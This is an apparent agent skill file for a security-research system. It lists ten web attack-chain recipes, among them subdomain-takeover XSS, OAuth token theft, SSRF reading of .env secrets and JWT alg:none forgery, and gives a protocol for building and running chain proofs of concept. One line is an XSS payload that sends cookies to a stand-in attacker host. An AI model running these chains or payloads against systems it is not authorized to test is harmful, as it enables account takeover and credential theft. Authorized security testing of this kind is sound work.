---
name: chain-hunt
description: Attack chain execution, multi-class escalation, CVE chain recipes. After DISCOVERY finds candidates — active testing, payload firing, CVE verification. Use when testing CHAIN vulnerabilities.
---

# SKILL-CHAIN-HUNT — Attack Chain Hunt — HUNT
# Phase Coverage: 42
# Purpose: Pre-built chain recipes and execution protocol for multi-class escalation

---

## Pre-Built Chain Recipes

### Chain 1: Subdomain Takeover -> ATO on Main App
```
FINDING A: Subdomain takeover on sub.target.com (HIGH)
FINDING B: Cookie scope .target.com (detected in recon)

CHAIN:
  1. Claim sub.target.com via DNS takeover
  2. Host XSS payload on sub.target.com: <script>fetch('//attacker.com/?c='+document.cookie)</script>
  3. Victim visits sub.target.com (subdomain of trusted domain)
  4. XSS executes, steals main app cookies (scope .target.com)
  5. Attacker uses stolen cookies to access main app as victim

IMPACT: C:H (session hijacking) + I:H (account takeover) = CRITICAL
```

### Chain 2: IDOR + CORS -> Cross-Origin Data Exfil
```
FINDING A: IDOR on /api/users/{id} (MEDIUM - reads other user data)
FINDING B: CORS misconfig with credentials (HIGH - any origin accepted with ACAO: *)

CHAIN:
  1. Attacker hosts page on attacker.com
  2. Page makes fetch() to target.com/api/users/1 with credentials: 'include'
  3. CORS allows attacker.com, cookies sent, IDOR returns user 1's data
  4. Attacker exfiltrates data to their server

IMPACT: C:H (mass PII exfiltration) = CRITICAL
```

### Chain 3: Self-XSS + CSRF -> Stored XSS Delivery
```
FINDING A: Self-XSS in profile bio (LOW - only affects self)
FINDING B: CSRF on profile update (MEDIUM - no token validation)

CHAIN:
  1. Attacker creates CSRF page that submits profile update with XSS payload
  2. Victim visits attacker's page while logged in
  3. CSRF updates victim's profile with XSS payload
  4. Admin views victim's profile -> XSS executes -> admin session stolen

IMPACT: I:H (admin ATO) = CRITICAL
```

### Chain 4: Open Redirect + OAuth -> Token Theft
```
FINDING A: Open redirect on /redirect?url= (LOW)
FINDING B: OAuth flow with redirect_uri validation (MEDIUM - partial check)

CHAIN:
  1. Attacker crafts OAuth authorize URL with redirect_uri=target.com/redirect?url=attacker.com
  2. Victim clicks, authorizes app
  3. OAuth server redirects to target.com/redirect?url=attacker.com
  4. Open redirect forwards to attacker.com with auth code in URL
  5. Attacker exchanges code for access token

IMPACT: C:H (account takeover) = CRITICAL
```

### Chain 5: File Upload XSS + Admin Views Uploads -> ATO
```
FINDING A: SVG XSS via file upload (MEDIUM)
FINDING B: Admin panel displays user uploads (detected in recon)

CHAIN:
  1. Attacker uploads SVG with XSS payload
  2. Admin views user uploads in admin panel
  3. SVG renders, XSS executes in admin context
  4. Admin session stolen -> full admin access

IMPACT: I:H (admin ATO) = CRITICAL
```

### Chain 6: SSRF + .env -> Full Server Compromise
```
FINDING A: SSRF on /api/preview (MEDIUM - can fetch internal)
FINDING B: .env file readable (HIGH - contains credentials)

CHAIN:
  1. SSRF to http://127.0.0.1:3000/.env
  2. Response contains DB_PASSWORD, AWS_SECRET_KEY
  3. Attacker uses credentials for full backend access

IMPACT: C:H + I:H = CRITICAL
```

### Chain 7: JWT alg:none + IDOR -> Mass ATO
```
FINDING A: JWT accepts alg:none (CRITICAL standalone)
FINDING B: IDOR on /api/users/{id} (MEDIUM)

CHAIN:
  1. Forge JWT with alg:none, sub=any_user_id, role=admin
  2. Use forged JWT to access /api/users/{id} for all users
  3. Extract all user credentials/tokens
  4. Mass account takeover

IMPACT: C:H + I:H = CRITICAL
```

### Chain 8: Business Logic + Race Condition -> Infinite Money
```
FINDING A: Business logic flaw - negative price accepted (HIGH)
FINDING B: Race condition on coupon redemption (MEDIUM)

CHAIN:
  1. Add item with negative price to cart
  2. Race coupon redemption 100x simultaneously
  3. Both succeed -> negative balance + infinite credits

IMPACT: I:H (financial fraud) = CRITICAL
```

### Chain 9: Prototype Pollution + DOM XSS -> Universal XSS
```
FINDING A: Prototype pollution via query string (MEDIUM)
FINDING B: DOM XSS sink reading from config object (MEDIUM)

CHAIN:
  1. Attacker sends victim link: ?__proto__[innerHTML]=<img src=x onerror=console.log(1)>
  2. Victim's browser pollutes Object.prototype
  3. App reads config.innerHTML (now polluted)
  4. DOM XSS executes without any script tag

IMPACT: C:H (universal XSS) = HIGH
```

### Chain 10: Cache Poisoning + XSS -> Persistent XSS
```
FINDING A: Cache poisoning via unkeyed header (MEDIUM)
FINDING B: Reflected XSS on search page (MEDIUM)

CHAIN:
  1. Attacker sends request: GET /search?q=safe with X-Forwarded-Host: attacker.com"><script>console.log(1)</script>
  2. Cache stores poisoned response
  3. All subsequent visitors to /search?q=safe receive XSS payload
  4. Persistent XSS without stored input

IMPACT: C:H (persistent XSS affecting all users) = HIGH
```

---

## Chain Execution Protocol

```
STEP 1: Read CHAIN_QUEUE from STATE_{SLUG}.md
STEP 2: For each finding in queue:
  a. Query wiki for chain candidates (findings with compatible classes)
  b. Evaluate top 3 candidates using chain recipes above
  c. Write chain reasoning note to wiki
  d. If chain looks viable, create chain PoC script
  e. Execute chain PoC, confirm end-to-end impact
  f. If confirmed: save as chain finding, update LEADERBOARD
  g. If failed: log failure reason, move to next candidate
STEP 3: Update CHAIN_QUEUE status
STEP 4: If new findings discovered during chaining, add to queue and repeat
```

---

*SKILL-CHAIN-HUNT — Part of the acy Agentic Security Research System v3.0*
